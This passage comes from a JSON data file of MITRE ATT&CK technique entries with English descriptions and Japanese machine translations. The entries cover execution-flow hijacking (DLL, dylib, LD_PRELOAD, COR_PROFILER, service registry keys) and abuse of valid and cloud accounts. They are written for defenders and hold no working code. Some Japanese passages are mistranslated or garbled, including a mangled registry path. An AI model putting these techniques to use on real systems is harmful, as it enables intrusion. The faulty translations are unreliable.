                        "description_jp": "攻撃者は、被害者のアプリケーションが実行時に検索するパスに、予想される名前の悪意のあるダイナミック・ライブラリ（dylib）を配置することで、独自のペイロードを実行する可能性があります。ダイナミック・ローダーは、検索パスの順序に基づいて、dylib を見つけようとします。ディリブへのパスの先頭には <code>@rpath</code> を付けることができ、開発者は相対パスを使用して実行可能ファイルの場所に基づいて実行時に使用される検索パスの配列を指定することができます。  さらに、<code>LC_LOAD_WEAK_DYLIB</code> 関数のような弱いリンクが使用されている場合、期待される dylib が存在しなくてもアプリケーションは実行されます。弱いリンクによって、開発者は新しいAPIが追加されたときに、複数のmacOSバージョンでアプリケーションを実行することができます。\n\n攻撃者は、特定されたパスに欠落している dylib の名前を持つ悪意のある dylib を挿入することで、実行を獲得する可能性があります（引用：Wardle Dylib Hijack Vulnerable Apps）（引用：Wardle Dylib Hijacking OSX 2015）（引用：Github EmpireProject HijackScanner）（引用：Github EmpireProject CreateHijacker Dylib） dylib はアプリケーションのアドレス空間にロードされ、悪意のある dylib がアプリケーションの特権レベルとリソースを継承できるようになります。アプリケーションによっては、特権の昇格や無制限のネットワークアクセスを引き起こす可能性があります。この方法は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品からの検出を回避することもできます。 (引用：Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)"
                    },
                    {
                        "id": "T1574.006",
                        "name_eng": "Dynamic Linker Hijacking",
                        "name_jp": "ダイナミック・リンカー・ハイジャッキング",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)\n\nHijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious library’s `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564) from detection, as hooking system functions such as `execve` and `readdir` enables malware to scrub its own artifacts from the results of commands such as `ls`, `ldd`, `iptables`, and `dmesg`.(Citation: ESET Ebury Oct 2017)(Citation: Intezer Symbiote 2022)(Citation: Elastic Security Labs Pumakit 2024)\n\nHijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.",
                        "description_jp": "攻撃者は、ダイナミックリンカーが共有ライブラリをロードするために使用する環境変数をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。プログラムの実行準備段階で、ダイナミックリンカーは、Linux の <code>LD_PRELOAD</code> や macOS の <code>DYLD_INSERT_LIBRARIES</code> など、さまざまな環境変数やファイルから共有ライブラリの指定された絶対パスをロードします。(引用: TheEvilBit DYLD_INSERT_LIBRARIES)(引用: Timac DYLD_INSERT_LIBRARIES)(引用: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) 環境変数で指定されたライブラリは、同じ関数名のシステムライブラリよりも優先して最初にロードされます。(引用: Man LD.SO)(引用: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) 各プラットフォームのリンカーは、実行のさまざまな時点で環境変数の広範なリストを使用します。これらの変数は、開発者が再コンパイルすることなくバイナリをデバッグしたり、マップされたシンボルの競合を解除したり、元のライブラリにカスタム関数を実装したりするために、しばしば使用される(引用: Baeldung LD_PRELOAD)\n\nダイナミック・リンカー変数をハイジャックすると、被害者プロセスのメモリ、システム/ネットワーク・リソースへのアクセスが許可され、特権が昇格する可能性があります。Linux では、敵対者は <code>LD_PRELOAD<//code> を設定して、被害者プログラムによって要求された正当なライブラリの名前と一致する悪意のあるライブラリを指すようにし、被害者プログラムの実行時にオペレーティングシステムに敵対者の悪意のあるコードをロードさせる可能性があります。例えば、敵は `LD_PRELOAD` を使って `sshd` デーモンのすべての子孫プロセスに悪意のあるライブラリを注入し、結果として正規のプロセスで実行させる。実行中のサブプロセスが `execve` 関数を呼び出すと、ディスク上のシステムライブラリに含まれるシステム関数 `execve` ではなく、悪意のあるライブラリの `execve` 関数が実行される。execve`や`readdir`などのシステム関数をフックすることで、マルウェアが`ls`、`ldd`、`iptables`、`dmesg`などのコマンドの結果から自身のアーティファクトをスクラブすることが可能になるため、敵対者は検出から[アーティファクトを隠す](https://attack.mitre.org/techniques/T1564)ことができる(引用：ESET Ebury Oct 2017)(引用：Intezer Symbiote 2022)(引用：Elastic Security Labs Pumakit 2024)\n\n動的リンカー変数をハイジャックすることで、被害者プロセスのメモリ、システム/ネットワークリソースへのアクセスが許可され、特権が昇格する可能性があります。"
                    },
                    {
                        "id": "T1574.014",
                        "name_eng": "AppDomainManager",
                        "name_jp": "AppDomainManager",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code.(Citation: Microsoft App Domains) \n\nKnown as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.(Citation: PenTestLabs AppDomainManagerInject)(Citation: PwC Yellow Liderc)(Citation: Rapid7 AppDomain Manager Injection)",
                        "description_jp": "攻撃者は、.NET の `AppDomainManager` がアセンブリをロードする方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。.NETフレームワークは、`AppDomainManager`クラスを使用して、.NETアプリケーションの実行をホストするプロセス内に1つ以上の隔離された実行環境（アプリケーションドメインと呼ばれる）を作成し、管理します。アセンブリ（.NETコードとして実行するためにコンパイルされた`.exe`または`.dll`バイナリ）は、実行可能コードとしてアプリケーションドメインにロードすることができる（引用：Microsoft App Domains）。\n\nAppDomainManagerインジェクション」として知られるこの攻撃は、.NETアプリケーションがアセンブリをロードする方法をハイジャックすることで、任意のコードを実行する可能性があります。例えば、マルウェアはターゲットプロセス内にカスタムアプリケーションドメインを作成し、任意のアセンブリをロードして実行します。あるいは、.NET ランタイム設定を定義する設定ファイル (`.config`) やプロセス環境変数が改ざんされ、悪意のあるアセンブリ (名前で識別される) をターゲットプロセスにロードするよう、良性の .NET アプリケーションに指示することもあります。 (引用: PenTestLabs AppDomainManagerInject) (引用: PwC Yellow Liderc) (引用: Rapid7 AppDomain Manager Injection)"
                    },
                    {
                        "id": "T1574.001",
                        "name_eng": "DLL",
                        "name_jp": "DLL",
                        "description_eng": "Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)\n\nSpecific ways DLLs are abused by adversaries include:\n\n### DLL Sideloading\nAdversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).\n\nSide-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.\n\nAdversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)\n\n### DLL Search Order Hijacking\nAdversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)\n\n### DLL Redirection\nAdversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)\n\n### Phantom DLL Hijacking\nAdversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)\n\n### DLL Substitution\nAdversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)\n\nPrograms that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.\n\nRemote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)\n\nIf a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",
                        "description_jp": "攻撃者は、永続性を実現し、特権を昇格させ、防御を回避するために、ダイナミック・リンク・ライブラリ・ファイル（DLL）を悪用する可能性がある。DLLは、複数のプログラムで同時に利用できるコードとデータを含むライブラリである。DLLは本来悪意のあるものではないが、サイドローディング、検索順序の乗っ取り、ファントムDLLハイジャックなどのメカニズムによって悪用される可能性がある(引用：ユニット42)。\n\nDLLが敵対者によって悪用される具体的な方法には、次のようなものがある：\n\n### DLL サイドローディング\nDLLのサイドローディング 敵は、DLLをサイドローディングすることで、独自の悪意のあるペイロードを実行する可能性があります。サイドローディングは、プログラムがロードする DLL を植え付け、ペイロードを実行する正規のアプリケーションを起動することで、DLL を乗っ取ることを意味します。\n\nサイドローディングは、被害者アプリケーションと悪意のあるペイロードの両方を、互いに隣り合わせに配置します。攻撃者はサイドローディングを、正規の、信頼された、潜在的に昇格されたシステムまたはソフトウェアプロセスの下で実行するアクションを隠す手段として使用している可能性が高いです。ペイロードのサイドローディングに使用される良性の実行ファイルは、配信中や実行中にフラグが立てられない可能性があります。敵対的なペイロードは、信頼されたプロセスのメモリにロードされるまで、暗号化/パックされるか、または他の方法で難読化される可能性もあります。\n\n攻撃者は、BPL (Borland Package Library) などの他のパッケージをサイドロードすることもあります(引用: kroll bpl)。\n\n### DLL 検索順序のハイジャック\n攻撃者は、Windows が DLL をロードする際に使用する検索順序をハイジャックすることで、独自の悪質なペイロードを実行する可能性があります。この検索順序は、DLL をロードする際にプログラムがチェックする、特別な検索場所と標準的な検索場所のシーケンスです。敵対者は、DLLの検索順序によって正当なライブラリの場所よりも優先されるディレクトリに、トロイの木馬のDLLを仕込むことができる。これにより、被害者プログラムによって悪意のあるDLLが呼び出されると、Windowsはそれをロードするようになる(引用：ユニット42)。\n\n### DLL リダイレクト\nDLLリダイレクトは、有効化された後（レジストリまたはリダイレクトファイルの作成により）、プログラムに別の場所からDLLをロードさせる可能性があります。 引用：Microsoft リダイレクト）（引用：Microsoft - manifests/assembly\n\n### ファントム DLL ハイジャック\n攻撃者は、存在しない DLL ファイルへの参照を標的とすることで、ファントム DLL ハイジャックを利用する可能性があります。彼らは、存在しないモジュールの場所に正しい名前で悪意のある DLL を仕込むことで、独自の悪意のある DLL をロードできる可能性があります(引用: Hexacorn DLL ハイジャック)(引用: Hijack DLLs CrowdStrike)\n\n### DLL の置換\n攻撃者は、既存の有効な DLL ファイルを標的にし、有効な DLL ファイルと同じ名前と同じ場所に、自分自身の悪意のある DLL を植え付けることで、DLL を置き換える可能性があります(引用: Wietze Beukema DLL ハイジャック)。\n\nDLLハイジャックの被害に遭ったプログラムは、悪意のあるDLLが正規のDLLも読み込むように設定されているため、防御を回避して正常に動作しているように見えることがある。\n\nリモートDLLハイジャックは、DLLをロードする前にプログラムがカレントディレクトリをWeb共有などのリモートの場所に設定することで発生する可能性がある(引用：DLL pre load owasp)(引用：Microsoft remote preloading)\n\n有効なDLLがより高い特権レベルで実行されるように設定されている場合、ロードされる敵に制御されたDLLもより高いレベルで実行される。この場合、このテクニックは特権の昇格に使われる可能性がある。"
                    },
                    {
                        "id": "T1574.008",
                        "name_eng": "Path Interception by Search Order Hijacking",
                        "name_jp": "サーチ・オーダー・ハイジャックによる進路妨害",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL](https://attack.mitre.org/techniques/T1574/001).",
                        "description_jp": "攻撃者は、他のプログラムのロードに使用される検索順序をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性がある。プログラムによってはフルパスで他のプログラムを呼び出さないものもあるため、敵は呼び出し元のプログラムがあるディレクトリに自分のファイルを置き、呼び出し元のプログラムの要求に応じてオペレーティングシステムが悪意のあるソフトウェアを起動するように仕向ける可能性がある。\n\n検索順序のハイジャックは、敵対者がWindowsがパスを与えられていないプログラムを検索する順序を悪用することで発生する。DLL](https://attack.mitre.org/techniques/T1574/001)の検索順ハイジャックとは異なり、検索順はプログラムの実行に使用されるメソッドによって異なります。(引用: Microsoft CreateProcess) (引用: Windows NT Command Shell) (引用: Microsoft WinExec) しかし、WindowsはWindowsシステムディレクトリを検索する前に、開始プログラムのディレクトリを検索するのが一般的である。検索順序のハイジャックに対して脆弱なプログラム（すなわち、実行可能ファイルへのパスを指定しないプログラム）を見つけた敵対者は、不適切に指定されたプログラムにちなんだ名前のプログラムを作成し、それを開始プログラムのディレクトリ内に配置することによって、この脆弱性を利用することができる。\n\n例えば、\"example.exe \"はコマンドライン引数<code>net user</code>で \"cmd.exe \"を実行する。敵対者がexample.exeと同じディレクトリに「net.exe」というプログラムを置くと、「net.exe」はWindowsのシステムユーティリティ「net」の代わりに実行される。さらに、敵が「net.com」と呼ばれるプログラムを「net.exe」と同じディレクトリに置いた場合、<code>cmd.exe /C net user</code>は、PATHEXTで定義された実行可能な拡張子の順序により、「net.exe」の代わりに「net.com」を実行する。(引用: Microsoft Environment Property)\n\n検索順のハイジャックもDLLのロードをハイジャックするための一般的な方法で、[DLL](https://attack.mitre.org/techniques/T1574/001)でカバーされています。"
                    },
                    {
                        "id": "T1574.011",
                        "name_eng": "Services Registry Permissions Weakness",
                        "name_jp": "サービス レジストリ パーミッションの脆弱性",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                        "description_jp": "攻撃者は、サービスが使用するレジストリ・エントリをハイジャックすることで、独自の悪意のあるペイロードを実行する可能性がある。攻撃者は、サービスに関連するレジストリ キーのパーミッションの欠陥を利用して、サービスの起動時に独自のコードを起動するために、本来指定されている実行可能ファイルから自分たちが制御する実行可能ファイルへとリダイレクトする可能性がある。Windowsは、レジストリの<code>HKLMMAPCESTMACCurrentControllServices</code>の下にローカルサービスのコンフィギュレーション情報を格納します。サービスのレジストリキーの下に格納された情報は、サービスコントローラー、sc.exe、[PowerShell](https://attack.mitre.org/techniques/T1059/001)、または[Reg](https://attack.mitre.org/software/S0075)のようなツールを使って、サービスの実行パラメーターを変更するために操作することができる。レジストリ・キーへのアクセスは、アクセス制御リストとユーザー権限によって制御される。(引用：レジストリキーのセキュリティ）（引用：malware_hides_service）\n\nユーザーやグループのパーミッションが適切に設定されておらず、サービスのレジストリ・キーへのアクセスを許可している場合、敵対者はサービスのbinPath/ImagePathを変更し、自分のコントロール下にある別の実行ファイルを指すようにする可能性があります。サービスが開始または再起動されると、敵が制御するプログラムが実行され、サービスが実行されるように設定されたアカウントコンテキスト（ローカル/ドメインアカウント、SYSTEM、LocalService、またはNetworkService）への永続化および/または特権昇格が可能になります。\n\n逆境者はまた、サービスのレジストリツリー内の他のレジストリキーを変更する可能性があります。たとえば、<code>FailureCommand</code>キーが変更され、サービスに障害が発生したり、サービスが意図的に破損したりした場合に、いつでも昇格したコンテキストでサービスが実行されるようにすることができる。 引用：Kansa サービス関連コレクター）（引用：Tweet Registry Perms Weakness\n\n<code>Performance</code>キーには、ドライバ サービスのパフォーマンス DLL の名前と、DLL 内のいくつかのエクスポートされた関数の名前が含まれます。(引用: microsoft_services_registry_tree) <code>Performance</code> キーがまだ存在せず、敵に制御されたユーザーが <code>Create Subkey</code> 権限を持っている場合、敵はサービスのレジストリ ツリーに悪意のある DLL を指す <code>Performance</code> キーを作成する可能性があります。\n\nまた、ドライバ固有のデータを格納する <code>Parameters</code> キーや、その他のカスタム サブキーを悪意のあるサービスに追加して、永続性を確立したり、その他の悪意のある活動を可能にしたりすることもできます。(引用: microsoft_services_registry_tree)(引用: troj_zegost) さらに、敵対者が svchost.exe を使用して悪意のあるサービスを起動する場合、サービスのファイルは <code>HKEY_LOCAL_MACHINESYSTEM\\CurrentControlSet\\Servicesservicename\\Parameters\\ServiceDll</code> を使用して識別される可能性があります(引用: malware_hides_service)。"
                    },
                    {
                        "id": "T1574.012",
                        "name_eng": "COR_PROFILER",
                        "name_jp": "COR_PROFILER",
                        "description_eng": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",
                        "description_jp": "攻撃者は COR_PROFILER 環境変数を利用して、.NET CLR をロードするプログラムの実行フローを乗っ取る可能性があります。COR_PROFILERは.NET Frameworkの機能で、開発者は共通言語ランタイム（CLR）をロードする各.NETプロセスにロードされるアンマネージド（または.NETの外部）プロファイリングDLLを指定できます。これらのプロファイラーは、.NET CLRで実行されるマネージドコードを監視、トラブルシューティング、デバッグするために設計されています。(引用: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nCOR_PROFILER 環境変数は、さまざまなスコープ（システム、ユーザー、またはプロセス）で設定でき、その結果、影響力のレベルが異なります。システムおよびユーザー全体の環境変数スコープは、[Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) オブジェクトをプロファイラ DLL として登録できるレジストリで指定されます。プロセススコープCOR_PROFILERは、レジストリを変更することなくメモリ内に作成することもできます。.NET Framework 4からは、COR_PROFILER_PATH環境変数にDLLの場所が指定されていれば、プロファイリングDLLを登録する必要はありません（引用：Microsoft COR_PROFILER 2013年2月）。\n\n攻撃者はCOR_PROFILERを悪用して、CLRが呼び出されるたびにすべての.NETプロセスのコンテキストで悪意のあるDLLを実行する永続性を確立する可能性があります。また、COR_PROFILERは、被害者である.NETプロセスがより高い権限レベルで実行されている場合、権限の昇格（例：[Bypass User Account Control]（https://attack.mitre.org/techniques/T1548/002））や、フックおよび[Impair Defenses]（https://attack。mitre.org/techniques/T1562).NETプロセスによって提供される。(引用: RedCanary Mockingbird 2020年5月)(引用: Red Canary COR_PROFILER 2020年5月)(引用: Almond COR_PROFILER 2019年4月)(引用: GitHub OmerYa Invisi-Shell)(引用: subTee .NET Profilers 2017年5月)"
                    }
                ]
            },
            {
                "id": "T1078",
                "name_eng": "Valid Accounts",
                "name_jp": "有効なアカウント",
                "description_eng": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "description_jp": "攻撃者は、初期アクセス、永続性、特権のエスカレーション、または防御回避を獲得する手段として、 既存のアカウントのクレデンシャルを入手して悪用する可能性がある。また、VPN、Outlook Web Access、ネットワーク・デバイス、リモート・デスクトップなど、リモート・システムや外部で利用可能なサービスへの永続的なアクセスに使用される可能性もあります（引用：volexity_0day_sophos_FW）。敵対者は、その存在を検出しにくくするために、これらの認証情報が提供する正当なアクセスとともにマルウェアやツールを使用しないことを選択する可能性があります。\n\n場合によっては、敵対者は非アクティブなアカウントを悪用することがある。このようなアカウントを使用することで、敵対者は検知を逃れることができるかもしれない。\n\n敵対者は、企業内で設定されたアクセス制御を迂回するために、アカウントやシステムを跨いで高レ ベルのアクセス（ドメイン管理者または企業管理者）に到達することができる可能性があるため、シス テムのネットワーク全体でローカル、ドメイン、クラウドの各アカウントの権限が重複していることが懸念さ れる（引用：TechNet Credential Theft）。",
                "subtechniques": [
                    {
                        "id": "T1078.004",
                        "name_eng": "Cloud Accounts",
                        "name_jp": "クラウド口座",
                        "description_eng": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)\n\nService or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s to move laterally across the cloud environment.(Citation: SpecterOps Managed Identity 2022)",
                        "description_jp": "クラウド環境における有効なアカウントは、敵対者が初期アクセス、永続性、特権の昇格、または防御回避を達成するためのアクションを実行することを可能にする可能性がある。クラウドアカウントは、ユーザ、リモートサポート、サービス、またはクラウドサービスプロバイダや SaaS アプリケーション内のリソースの管理のために、組織によって作成され設定される。クラウド・アカウントは、クラウドのみに存在することもできるが、Windows Active Directory などの他の ID ソースとの同期またはフェデレーションによって、オンプレミス・システムとクラウドの間でハイブリッドに結合されることもある（引用：AWS Identity Federation）。\n\nブルートフォース](https://attack.mitre.org/techniques/T1110)、[フィッシング](https://attack.mitre.org/techniques/T1566)、または環境にアクセスするための他のさまざまな手段によって、サービスまたはユーザーアカウントが敵に狙われる可能性がある。フェデレートされたアカウントや同期されたアカウントは、敵がオンプレミスシステムとクラウド環境の両方に影響を与える経路となる可能性があります。例えば、共有された認証情報を活用して[リモートサービス](https://attack.mitre.org/techniques/T1021)にログオンすることが挙げられます。高権限のクラウド・アカウントは、連携、同期、クラウド専用のいずれであっても、SaaSベースの[Software Deployment Tools](https://attack.mitre.org/techniques/T1072)を活用してハイブリッド接続されたデバイス上でコマンドを実行することで、オンプレミス環境へのピボットを可能にする可能性もある。\n\n敵対者は、侵害されたクラウドアカウントで長期間の[追加クラウド・クレデンシャル](https://attack.mitre.org/techniques/T1098/001)を作成し、環境での永続性を維持する可能性があります。このようなクレデンシャルは、多要素認証のようなセキュリティ制御をバイパスするためにも使用されるかもしれません。\n\nクラウドアカウントはまた、環境内の様々な手段を通じて[Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)やその他の特権を引き受けることができるかもしれません。役割の割り当てや役割の引き受けポリシーの設定を誤ると、敵対者はこれらのメカニズムを使用して、アカウントの意図された範囲外の権限を活用することができます。そのような過剰な権限を持つアカウントは、[Cloud API](https://attack.mitre.org/techniques/T1059/009)または他の方法を通じて、オンラインストレージアカウントやデータベースから機密データを採取するために使用される可能性がある。例えば、Azure環境では、敵対者は、関連するAzureリソースがアクセストークンを要求できるようにするAzure Managed Identityを標的にする可能性があります。敵対者は、Azure VM などのマネージド ID がアタッチされたリソースを侵害することで、[Steal Application Access 